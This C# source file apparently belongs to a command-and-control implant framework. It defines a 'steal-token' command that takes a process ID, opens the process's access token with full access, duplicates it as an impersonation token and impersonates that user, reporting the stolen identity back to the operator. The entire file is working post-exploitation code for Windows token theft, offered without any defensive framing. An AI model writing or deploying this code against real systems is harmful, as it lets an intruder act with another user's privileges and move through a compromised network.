using Agent.Commands;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Commands
{
    public class StealTokenCommand : AgentCommand
    {
        public override string Name => "steal-token";
        public override void InnerExecute(AgentTask task, Agent.Models.Agent agent, AgentTaskResult result, CommModule commm)
        {
            if (!int.TryParse(task.SplittedArgs[0], out var pid))
            {
                result.Result += $"Faile to parse ProcessId";
                return;
            }

            var process = Process.GetProcessById(pid);

            var hToken = IntPtr.Zero;
            var hTokenDup = IntPtr.Zero;

            try
            {
                //open handle to token
                if (!Agent.Native.Advapi.OpenProcessToken(process.Handle, Agent.Native.Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
                {
                    result.Result += $"Failed to open process token";
                    return;
                }

                //duplicate  token
                var sa = new Agent.Native.Advapi.SECURITY_ATTRIBUTES();
                 if(!Agent.Native.Advapi.DuplicateTokenEx(hToken, Agent.Native.Advapi.TokenAccess.TOKEN_ALL_ACCESS, ref sa, Agent.Native.Advapi.SecurityImpersonationLevel.SECURITY_IMPERSONATION, Agent.Native.Advapi.TokenType.TOKEN_IMPERSONATION, out  hTokenDup))
                {
                    Agent.Native.Kernel32.CloseHandle(hToken);
                    process.Dispose();
                    result.Result += $"Failed to duplicate token";
                    return;
                }

                //impersonate Token
                if (Agent.Native.Advapi.ImpersonateLoggedOnUser(hTokenDup))
                {
                    var identity = new WindowsIdentity(hTokenDup);
                    Agent.Native.Kernel32.CloseHandle(hToken);
                    process.Dispose();

                    result.Result += $"Successfully impersonate token {identity.Name}";
                    return;
                }


                result.Result += $"Failed to impersonate token";
                return;
            }
            catch
            {

            }
            finally
            {
                if (hToken != IntPtr.Zero)
                    Agent.Native.Kernel32.CloseHandle(hToken);
                if (hTokenDup != IntPtr.Zero)
                    Agent.Native.Kernel32.CloseHandle(hTokenDup);
                process.Dispose();
            }

        }
    }
}
